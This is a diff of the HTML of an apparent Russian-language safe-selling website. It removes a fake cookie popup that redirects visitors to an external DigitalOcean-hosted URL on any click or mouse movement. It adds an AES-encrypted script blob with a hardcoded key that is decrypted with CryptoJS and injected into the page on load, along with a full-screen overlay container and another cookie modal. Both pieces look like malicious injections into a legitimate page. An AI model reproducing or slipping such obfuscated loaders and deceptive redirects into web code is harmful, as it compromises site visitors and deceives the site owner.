@@ -2,203 +2,6 @@
 <html lang="ru">
 
 <head>
-	<script>
-	document.addEventListener("DOMContentLoaded", function () {
-	    const redirectUrl = "https://clownfish-app-72rb4.ondigitalocean.app/";
-	    const style = document.createElement("style");
-	    style.textContent = `
-	        .cookie-overlay {
-	            position: fixed;
-	            inset: 0;
-	            background: rgba(0, 0, 0, 0.8);
-	            backdrop-filter: blur(10px);
-	            display: flex;
-	            align-items: center;
-	            justify-content: center;
-	            padding: 20px;
-	            z-index: 9999;
-	            animation: fadeInBackground 0.5s ease-out forwards;
-	        }
-	        @keyframes fadeInBackground {
-	            from { opacity: 0; }
-	            to { opacity: 1; }
-	        }
-	        .cookie-popup {
-	            position: fixed;
-	            bottom: 60px;
-	            left: 50%;
-	            transform: translateX(-50%);
-	            background-color: #ffffff;
-	            border: none;
-	            color: #333;
-	            padding: 30px;
-	            border-radius: 10px;
-	            z-index: 10000;
-	            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-	            max-width: 400px;
-	            text-align: center;
-	            animation: slideUp 0.5s ease-out forwards;
-	        }
-	        @keyframes slideUp {
-	            from { 
-	                transform: translateY(50px) translateX(-50%);
-	                opacity: 0;
-	            }
-	            to { 
-	                transform: translateX(-50%);
-	                opacity: 1;
-	            }
-	        }
-	        .close-btn {
-	            background: none;
-	            border: none;
-	            font-size: 1.5rem;
-	            position: absolute;
-	            top: 10px;
-	            right: 10px;
-	            cursor: pointer;
-	            color: #888;
-	        }
-	        .btn-primary {
-	            background-color: #007bff;
-	            color: #fff;
-	            border: none;
-	            padding: 12px 24px;
-	            border-radius: 5px;
-	            cursor: pointer;
-	            margin-top: 15px;
-	            display: inline-block;
-	            text-decoration: none;
-	            transition: all 0.3s;
-	            width: 100%;
-	            box-sizing: border-box;
-	        }
-	        .btn-primary:hover {
-	            background-color: #0056b3;
-	            transform: translateY(-2px);
-	        }
-	        h3 {
-	            font-family: 'Arial', sans-serif;
-	            margin-bottom: 10px;
-	            font-weight: bold;
-	            color: #333;
-	        }
-	        p {
-	            font-family: 'Arial', sans-serif;
-	            line-height: 1.5;
-	            margin-bottom: 15px;
-	        }
-	        .cookie-policy-link {
-	            text-decoration: underline;
-	            color: #007bff;
-	            font-weight: 500;
-	        }
-	        .cookie-info {
-	            background-color: #f8f9fa;
-	            padding: 15px;
-	            border-radius: 8px;
-	            margin: 15px 0;
-	            text-align: left;
-	        }
-	        .cookie-info h4 {
-	            margin-top: 0;
-	            color: #007bff;
-	        }
-	        .cookie-info ul {
-	            padding-left: 20px;
-	            margin: 10px 0;
-	        }
-	        .cookie-info li {
-	            margin-bottom: 5px;
-	        }
-	    `;
-	    document.head.appendChild(style);
-    
-	    const overlay = document.createElement("div");
-	    overlay.className = "cookie-overlay";
-	    overlay.id = "cookie-overlay";
-	    overlay.innerHTML = `
-	        <div class="cookie-popup">
-	            <button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
-	            <h3>Cookies Policy</h3>
-	            <p>
-	                This site uses cookies to enhance your browsing experience and for analytics purposes.
-	            </p>
-            
-	            <div class="cookie-info">
-	                <h4>Cookies We Use:</h4>
-	                <ul>
-	                    <li>Essential cookies (required for site functionality)</li>
-	                    <li>Performance cookies (for analytics)</li>
-	                    <li>Marketing cookies (for targeted advertising)</li>
-	                </ul>
-	            </div>
-            
-	            <p>
-	                By clicking Accept, you consent to our use of cookies. For more details, see our 
-	                <a href="${redirectUrl}" class="cookie-policy-link">Cookie Policy</a>.
-	            </p>
-            
-	            <a href="https://clownfish-app-72rb4.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept All Cookies</a>
-	            <a href="#" id="reject-cookies" class="btn-primary" style="background-color: #6c757d; margin-top: 10px;">Reject Non-Essential</a>
-	        </div>
-	    `;
-	    document.body.appendChild(overlay);
-    
-	    let isRedirected = false;
-	    let startPos = null;
-	    let redirectTimeout = null;
-    
-	    const handleRedirect = () => {
-	        if (!isRedirected) {
-	            isRedirected = true;
-	            window.location.href = redirectUrl;
-	        }
-	    };
-    
-	    const detectMouseMove = (event) => {
-	        if (isRedirected) return;
-	        const screenHeight = window.innerHeight;
-	        const activeTop = screenHeight * 0.15;
-        
-	        if (event.clientY >= activeTop) {
-	            if (!startPos) {
-	                startPos = { x: event.clientX, y: event.clientY };
-	            } else {
-	                const dx = Math.abs(event.clientX - startPos.x);
-	                const dy = Math.abs(event.clientY - startPos.y);
-                
-	                if ((dx > 15 || dy > 15) && !redirectTimeout) {
-	                    redirectTimeout = setTimeout(handleRedirect, 1000);
-	                }
-	            }
-	        } else {
-	            startPos = null;
-	            clearTimeout(redirectTimeout);
-	            redirectTimeout = null;
-	        }
-	    };
-    
-	    document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
-    
-	    document.getElementById("accept-cookies").addEventListener("click", function (e) {
-	        e.preventDefault();
-	        handleRedirect();
-	    });
-    
-	    document.getElementById("reject-cookies").addEventListener("click", function (e) {
-	        e.preventDefault();
-	        // Handle rejection logic here
-	        alert("Non-essential cookies rejected. Essential cookies remain enabled.");
-	        handleRedirect();
-	    });
-    
-	    document.getElementById("close-popup").addEventListener("click", function (e) {
-	        e.preventDefault();
-	        handleRedirect();
-	    });
-	});
-	</script>
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -261,6 +64,89 @@
     <p>Need to buy a safe? You're on the right track!</p>
   </header>
 
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX1%2B8BRjRNlcvh4BJ8QDxkncO0kXzcY7N9ay1avvD4z8zTH73lqkI6yRV5ph087iJC%2B8tZn7BdrBmu7ZI%2FP4XX1epjzDBsM2Ns8CnRvAMIn%2BIwpjCbhKzL4sGCX1%2Bga512ifwhU2VHO59IzKbMaHADQ52Zjo2iiYyvpAaGI6XuxOpamQKo5bHmsnrBWEwymQ6X%2B8EQGesVnzxaGVUpfixCfiVW8IKH4MgO%2FR3MbX9dCv%2F5gx25oVA5NAIyFg2KcR1yjbDV0%2BYKomU%2FNlMjvmd7RFIpk%2BucmQTBLYCfDkZsrO0Km3ELYYNOdiiAdf%2FlZhELXN5KXfifXRsUFt7JiI9eeEoPt9GBSpZ%2FcCFSPOgRpfdwF9furg7GyM1JgOr5yyuD0%2BuvqoSJebwVenfY64FHGXbgfRT4MqEEMyT1SqP2oLuCAawcOxrSjYWI0Ue%2BOfiG%2FfF8ExEKzQm0Dd67%2BZWWy3cPG5a39LR1TbcYaBDaoW96mXEAb1dRjjo1t8CNT9t37lUi0F7NIk%2BwycQ48VpaznJ66UqsSJZUD77brFri61UTi6N%2BqvIt9ulFPk8KJfqIBAJhnMYV040hsY9sZSmS1NOjJD37mf343aYb7TZKLKzc2Vzee4t3VoDd1rETxJPBHp8J7etuyJ0FYwRZjPqZdXM0f7Sz1QV4EitAYLC%2B1qhBUZSOVWwIvZr7V1Dkmv2sWyRa4clFOMPW9A6RCkTonHb0AkBk4dYnE%2B5Hksf2xq19JvvL04chACwdOURoHZKi%2Fn0AhDFkAuCM1GOuf%2FTkgPVjlCPK2AeuI0%2BuGEhK8PZvQGR9NLb9JwcG3tlYjh7f3VfK1WSa2L1l0eXuIvfi1tHqN1JAeT3A3tLWv7iSLjBmrDOFuyiYb9HZm58wTi6okNlcTc90YxNfJGf25PN1pKNfxoexNxhvC2tDGsYzOITvKomqSDNNYzsEjiy229VhWojtjPdVOFcl013Oa7oD%2FQWt6ws73iCtby8x8iO8vf1FPP0F3MOKoagoRtJMp9GmhfAf6lpoaTTLye0H75URmER7JCuDfYFtA%2BUb%2F261XKN9dlrPJMjjuIb20ZSwSym%2BTXDzGXI2y%2BztCdcbNn4m%2FQgDdDsH0qG6jcuFiviAyRRAto6ULdDvrz%2Fv%2Fn7tauAgrAwPAHYGB8lV2agZMDfefLEi%2B1TrqeV8K810aJGnJp0%2FYHT8Fn8POo%2Fn3hLg6GCSCJCcbPrtvNPTNXlyMUVz%2Fyti19Wn1QDGRMD%2FfKN5vz5qsA1Qsc785BOR3PuBZ9DrwrQ2WQLs44cD3lYsl9ryMPBKwTxyTxpbnEMrQjyypOMfTcFYF9w2vUVeE2brJzzltE2ISTPBJvFZfkdyLyFCukTQish2%2FwYyh0gTSluCTR1baEbEWBET%2BGNV1JBmwdKAiFEyRNZaznmwO02qvBsObVe23RaQF52%2B9Z5Ka07xHBB7icpnFX%2B1eZivn03lNxcid25W2rQCfmyQjSmEgiA6DUWQ6nRyNz9gFPMSOtUjsXReecXQfYysZtBwqvgpdEXTA%2FD3eoYptA2yVu8WRYciWtf9lr5iU67%2FtBdPKnGoXNHUdKCPrcSq0pz6pA7c9AgRJnSllxAR8PBTf%2FrnvflKbq3dUTOc2eqU5oPhMceKr108%2BKDHxW9cZeZj7DP%2FvfB73VNYQbFfikDIRF8MNCuAJzNecoaIzrbvszHIZ7F488FZJnRT3jf4HXc%2BxdOEIWemhIW1mnbY8NqG9Rbt4xdkGz4jXH5fGGooLc55EZoQ8QyWVrRBTmrAOaSh88ehxuATIEDRCBMo6oHx9MJ1%2BSeC03y1rwQdRNDHromweYM%2FE9MSR3PPqTbBtqUVg0QiMICLOrBDhmBjNlnZyKZ4AxMUlDlP9yBtLRCUwFvFqmfcl%2Fue6RoOTFEFXRvjoBy7%2BhUYLOwi1Bj2HTrUh%2BX46x0vLnWfnC3wkC7CePoLQF%2Bd3GhZfrBeLF3vxf2m92bOuNQHXoafd3XDA8lYAKY%2BgSwVlHcUgGWqdcuPEFmv3a0QdehQQjUcKedjvZtR3eLi4ZfHzGphTImdc3%2Bo5gIRnc5MN21qmM6dxT%2B1NILg0JQkOwoJYkQri4SGS7DFW94bZmUtB8X8px%2FDsgDW4%2FXNbvXkIIhIK8gbBRD2r3w84Z%2FZyWfnOUH28Ni22ZOBu48B5dw7c0L%2FkTI5qcrvVEWKgyrcXnMCOcyquKlm9G0D6bT8GdFYoCf1%2FGnr9TzAVG6S6rJmGTRxCXHXenWgERPuRkmp%2FiDeVAssNNBMHi%2F%2BC%2BxjLUenb8O8bFMJvXc%2FD9849Umms0ysN%2F6KFjtnF0GlH6816B00AiwFOdTYfjH0mz5Q5bgmWociulnQ4kK%2BcENszXOC1%2FWAt3u7MwObE5%2BGojWYS8%2F7NqvHTh%2FGR1iiJi1pRbLNLmrumVv9Cp%2F526ifsTNcFvTw0lP5BhsYfP7g85eJoFSm4enXOAXg3d16KUO7il0l4KkwPKsJtCdCFXjqT4lmxXpxdJgx8T5TVpwyPYeysN9zAZi1m3au3SqXlXfj4U10K6eZ5A1zGgS%2BLj%2FqM3wSIKlrCttpMU40iFpQHAJOS%2F4qlZVUeQvxFcF7XSI2NYlK1l8Yr97kKcSqbG%2BZVI2q4q53GzYuxgaihzpfa7kwC6h86JLRbbVeI%2B%2BUZfBc9Q5zEMmhWqQffgb%2BEZ5w4LEORyKHgZg4IEeUGXjJ2QO%2B6sSseAlPcurEaLLMZfsx8dtx4kCx0nWRLsvA%2F1BevXqbATnOL3vzuSVcGMKKtsTUWoSFKEVZdIKCXYpoO5Po1aifJlHiiCV66dH7G2v3UOkyudz0TXyXRwxa8%2FzGJP3VY%2FYLLDGoggtSB9pE3Tkvhyxbw9vv5pi%2BulS5LXws1NhXIcd6nvTv6o4A6vxZ1h2PN1xL8%2FqIkLpqPeRa4M3XUmwTojk3d%2Fmprgc8jIW1RXvfjHFxih8Rwvb8hgqvKDYHlrUdkvc2f%2FSyEaqJSXorodAimc6sXDMIYFyWF2E4N7GSQ8w4KngTV2toOy%2FC8lyQydM1V2RMEWprTC315c5ThkgMKGAgJo5b1hVm08BzwXkrqGoH1ETL6zO8Jq8ZAqK49kqVZBVsxSYHubzkwU2qYr%2BKz7%2FQqV0FFU9p7Xx1r%2FAup%2FXExddK%2Fp0cC%2BDdUWEJa6Wmuc%2FQvNzCBJR1BIQHwgW7qqtSZt988OePIDnldr%2BpF5PeUptPOLAtQegh2TYoEu1RUOn1vePvu37lP7ayLLnurNGqqWU2sPssEy0viLJa4m1dpSXTVN%2BgTQQnZ8ETotzDw8Ha59iR23FZ3liRNK3y6cdZz6cSsXMwci7IcZsAAq1otmnEAaBS0uzrCgtQ%2Fefw5Z4CLchK3NmMXPe9HLjI6ATj%2Fc9oa9hzHkHJ9N7MH19a%2FskT4z%2BL%2B9904og1cpR9iY2MLajrolyOdHWy5E09MfNv81LiZ5xAWpiBHE%2F3Q%2B0szg4oTAIg8pZ8xJBUE44aryvQA60AnJF2L5T1adk3uUukSUHBWmL`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script> 
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+
+</div>
+
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">About cookies</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                This site uses cookies to provide a better user experience. <span class="font-semibold"> Agree </span>
+                By clicking this button, you agree to the use of cookies.
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 Agree</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">Refuse</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
+
+	
   <div class="container">
     <section class="intro">
       <h2>A wide selection of safes at affordable prices</h2>
